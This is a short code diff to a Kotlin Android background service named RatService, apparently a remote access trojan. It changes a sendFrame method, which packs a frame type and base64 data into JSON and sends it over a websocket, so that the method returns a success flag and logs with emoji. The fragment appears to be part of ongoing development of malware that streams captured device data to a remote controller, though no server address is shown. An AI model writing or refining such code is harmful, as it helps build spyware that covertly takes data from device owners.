@@ -172,8 +172,8 @@ class RatService : Service() {
         }.start()
     }
 
-    fun sendFrame(frameType: String, base64Data: String) {
-    try {
+    fun sendFrame(frameType: String, base64Data: String): Boolean {
+    return try {
         val payload = JsonObject().apply {
             addProperty("type", "event")
             add("data", gson.toJsonTree(mapOf(
@@ -184,9 +184,11 @@ class RatService : Service() {
             )))
         }
         ws?.send(gson.toJson(payload))
-        android.util.Log.i("RatService", "Frame sent: $frameType size=${base64Data.length}")
+        Log.i("RatService", "✅ Frame sent: $frameType size=${base64Data.length}")
+        true
     } catch (e: Exception) {
-        android.util.Log.e("RatService", "sendFrame error", e)
+        Log.e("RatService", "❌ sendFrame error", e)
+        false
     }
 }
     
